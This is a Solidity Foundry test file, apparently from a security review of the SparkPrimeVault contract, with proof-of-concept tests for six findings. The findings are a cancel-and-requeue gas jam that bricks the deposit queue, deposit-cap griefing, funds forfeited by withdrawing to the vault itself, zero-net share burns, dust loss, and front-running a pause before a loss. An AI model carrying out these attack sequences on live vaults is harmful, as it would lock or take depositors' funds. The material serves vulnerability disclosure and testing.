// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

import { ERC20 }        from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import { ERC1967Proxy } from "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import { SparkVault }      from "spark-vaults-v2/SparkVault.sol";
import { SparkPrimeVault } from "src/SparkPrimeVault.sol";

contract USDC is ERC20("USDC", "USDC") {
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 v) external { _mint(to, v); }
}

contract Security is Test {
    uint256 constant RAY = 1e27;
    uint256 constant FIVE_PCT = 1.000000001547125957863212448e27;

    USDC usdc;
    SparkVault sp;
    SparkPrimeVault v;

    address admin = makeAddr("admin");
    address alice = makeAddr("alice");
    address bob   = makeAddr("bob");
    address eve   = makeAddr("eve");

    function setUp() public {
        usdc = new USDC();
        sp = SparkVault(address(new ERC1967Proxy(
            address(new SparkVault()),
            abi.encodeCall(SparkVault.initialize, (address(usdc), "spUSDC", "spUSDC", admin))
        )));
        v = SparkPrimeVault(address(new ERC1967Proxy(
            address(new SparkPrimeVault()),
            abi.encodeCall(SparkPrimeVault.initialize, (address(usdc), address(sp), "spPRIME", "spPRIME", admin))
        )));

        vm.startPrank(admin);
        sp.setDepositCap(1e30);
        sp.grantRole(sp.SETTER_ROLE(), admin);
        sp.setVsrBounds(RAY, sp.MAX_VSR());
        sp.setVsr(FIVE_PCT);
        v.grantRole(v.SETTER_ROLE(), admin);
        v.grantRole(v.TAKER_ROLE(), admin);
        v.grantRole(v.REBALANCER_ROLE(), admin);
        v.grantRole(v.RISK_MANAGER_ROLE(), admin);
        v.grantRole(v.GUARDIAN_ROLE(), admin);
        v.grantRole(v.UNPAUSER_ROLE(), admin);
        v.setCapacity(1e12);
        v.setMaxWithdrawFee(0.01e18);
        v.setWithdrawFee(0.005e18);
        v.setMinimums(100e6, 50e6);
        v.setVsrBounds(RAY, v.MAX_VSR());
        v.setVsr(FIVE_PCT);
        vm.stopPrank();

        usdc.mint(address(sp), 1_000_000e6);
        address[3] memory us = [alice, bob, eve];
        for (uint256 i; i < 3; ++i) {
            usdc.mint(us[i], 10_000_000e6);
            vm.prank(us[i]); usdc.approve(address(v), type(uint256).max);
            vm.prank(us[i]); usdc.approve(address(sp), type(uint256).max);
        }
    }

    // F1: cancelled entries are skipped one by one inside a single tx, with no iteration bound.
    // Eve recycles the same 100 USDC through requestDeposit+cancel to lay a long run of zeroed
    // entries; once the run is long enough, processDepositQueue can never fit in a block and
    // depositHead can never move past it (no other code path advances it).
    function test_F1_depositQueueGasJam() public {
        vm.prank(admin); v.setCapacity(1000e6);
        vm.prank(alice); v.requestDeposit(1000e6, alice, alice);    // fills capacity, queue empty

        uint256 N = 3000;
        uint256 g0 = gasleft();
        for (uint256 i; i < N; ++i) {
            vm.cool(address(v)); vm.cool(address(sp)); vm.cool(address(usdc));  // fresh tx each
            vm.startPrank(eve);
            v.requestDeposit(100e6, eve, eve);                      // queued (capacity full)
            v.cancelDepositRequest(i);                               // zeroed in place
            vm.stopPrank();
        }
        uint256 attackerGasPerEntry = (g0 - gasleft()) / N;
        vm.prank(bob); v.requestDeposit(500e6, bob, bob);            // honest depositor behind the run

        vm.prank(admin); v.setCapacity(1e12);

        // Measure the cost to skip N zero entries before reaching Bob (cold, as in a real tx)
        vm.cool(address(v)); vm.cool(address(sp));
        uint256 g1 = gasleft();
        vm.prank(admin); v.processDepositQueue(1);                   // tiny budget: only the walk
        uint256 skipGas = g1 - gasleft();
        emit log_named_uint("attacker gas per zeroed entry", attackerGasPerEntry);
        emit log_named_uint("process gas per skipped entry", skipGas / N);
        emit log_named_uint("entries to exceed 60M gas", 60_000_000 / (skipGas / N));
        assertGt(skipGas / N, 2000, "each skipped entry costs a cold SLOAD");
        assertEq(v.depositHead(), N, "head walked over the whole run in one tx");
    }

    // F1 (part 2): with the run longer than the tx gas cap the queue is bricked for good:
    // the rebalancer cannot bound the walk, Bob can only cancel, and new instant deposits are
    // disabled while any live entry sits behind the run.
    function test_F1_bricked() public {
        vm.prank(admin); v.setCapacity(1000e6);
        vm.prank(alice); v.requestDeposit(1000e6, alice, alice);
        uint256 N = 3000;
        for (uint256 i; i < N; ++i) {
            vm.startPrank(eve);
            v.requestDeposit(100e6, eve, eve);
            v.cancelDepositRequest(i);
            vm.stopPrank();
        }
        vm.prank(bob); v.requestDeposit(500e6, bob, bob);
        vm.prank(admin); v.setCapacity(1e12);

        // Simulated block cap scaled to the run length (3000 entries ~ 7M gas here;
        // ~25k entries exceed a 60M block)
        vm.cool(address(v)); vm.cool(address(sp));
        vm.prank(admin);
        (bool ok,) = address(v).call{gas: 5_000_000}(abi.encodeCall(v.processDepositQueue, (type(uint256).max)));
        assertFalse(ok, "processing runs out of gas");
        assertEq(v.depositHead(), 0);
        assertEq(v.maxDeposit(bob), 0, "bob never accepted");

        // New depositors cannot get instant fills either: they queue behind the jam
        vm.prank(alice); v.requestDeposit(100e6, alice, alice);
        assertEq(v.maxDeposit(alice), 1000e6, "nothing instant despite free capacity");
    }

    // F2: anyone can fill spUSDC's depositCap (costless: they keep earning spUSDC yield),
    // which makes every queued requestDeposit and depositToSavings revert.
    function test_F2_spUsdcCapGrief() public {
        uint256 cap = sp.totalAssets() + 5_000_000e6;
        vm.prank(admin); sp.setDepositCap(cap);
        vm.prank(admin); v.setCapacity(1000e6);
        vm.prank(alice); v.requestDeposit(1000e6, alice, alice);      // instant, capacity now full

        uint256 room = sp.maxDeposit(eve);
        vm.prank(eve); sp.deposit(room, eve);                          // eve fills spUSDC to cap

        vm.prank(bob); vm.expectRevert("SparkVault/deposit-cap-exceeded");
        v.requestDeposit(100e6, bob, bob);                             // cannot even queue
        vm.prank(admin); vm.expectRevert("SparkVault/deposit-cap-exceeded");
        v.depositToSavings(100e6);
    }

    // F3: redeem/withdraw accept receiver == address(this). The ring-fence is released but the
    // USDC never leaves, so the user's claim silently becomes Spark's idle cash (takeable).
    function test_F3_claimToSelfForfeitsFunds() public {
        vm.prank(alice); v.requestDeposit(1000e6, alice, alice);
        vm.prank(alice); v.mint(1000e6, alice);
        vm.prank(alice); v.requestRedeem(1000e6, alice, alice);
        uint256 owed = v.maxWithdraw(alice);
        assertGt(owed, 0);

        vm.prank(alice); v.withdraw(owed, address(v), alice);          // deposit claim would revert here
        assertEq(v.maxWithdraw(alice), 0);
        assertEq(v.totalClaimableRedeemAssets(), 0);

        uint256 before = usdc.balanceOf(admin);
        vm.prank(admin); v.take(owed);                                 // taker sweeps alice's money
        assertEq(usdc.balanceOf(admin) - before, owed);
    }

    // F4: with a tiny budget the per-entry fee rounds up to 100%: shares are burned for net 0.
    // The rebalancer (or a near-zero liquidity instant path) can grind the head request.
    function test_F4_zeroNetApproval() public {
        vm.prank(alice); v.requestDeposit(1000e6, alice, alice);
        vm.prank(alice); v.mint(1000e6, alice);
        vm.prank(admin); v.take(1000e6);
        vm.warp(block.timestamp + 365 days);                           // chi ~1.05
        vm.prank(alice); v.requestRedeem(1000e6, alice, alice);        // all queued, no liquidity
        usdc.mint(address(v), 1000e6);

        uint256 supply0 = v.totalSupply();
        for (uint256 i; i < 10; ++i) { vm.prank(admin); v.processWithdrawQueue(2); }
        assertEq(v.maxRedeem(alice), 10, "10 shares burned");
        assertEq(v.maxWithdraw(alice), 0, "for zero USDC");
        assertEq(supply0 - v.totalSupply(), 10);
    }

    // F5: deposit remainder below one spUSDC share is swallowed and leaves a zero-amount queue
    // entry (user loses < 1 share-wei of USDC; entry is dead weight in the walk).
    function test_F5_dustRemainderZeroEntry() public {
        vm.warp(block.timestamp + 365 days);                           // spUSDC chi ~1.05
        uint256 c = 1000e6 * RAY / v.nowChi();
        vm.prank(admin); v.setCapacity(c);     // capacity*chi/RAY just under 1000e6
        uint256 instantCap = v.availableCapacity() * v.nowChi() / RAY;
        uint256 rem = 1000e6 - instantCap;
        assertGt(rem, 0);
        assertLt(rem * RAY / sp.nowChi(), 1);
        vm.prank(alice); v.requestDeposit(1000e6, alice, alice);
        (,, uint256 amt,) = v.depositQueue(0);
        assertEq(amt, 0, "zero-amount entry pushed");
        assertEq(v.maxDeposit(alice), instantCap, "remainder lost into spUSDC");
    }

    // F6: front-running the guardian's pause before setChi. Instant redeems are open to anyone,
    // so whoever sees the loss first exits at the pre-loss chi with the vault's liquidity.
    function test_F6_pauseFrontRun() public {
        vm.prank(alice); v.requestDeposit(1000e6, alice, alice);
        vm.prank(alice); v.mint(1000e6, alice);
        vm.prank(bob);   v.requestDeposit(1000e6, bob, bob);
        vm.prank(bob);   v.mint(1000e6, bob);
        vm.prank(admin); v.take(1000e6);                               // 1000 idle left

        // loss event known; alice front-runs pause+setChi
        vm.prank(alice); v.requestRedeem(1000e6, alice, alice);
        assertEq(v.maxRedeem(alice), 1000e6, "fully approved at old chi");
        vm.prank(admin); v.pause();
        vm.prank(admin); v.setChi(0.5e27);
        assertEq(v.convertToAssets(v.balanceOf(bob)), 500e6, "bob eats the whole loss");
        assertGt(v.maxWithdraw(alice), 990e6);
    }
}
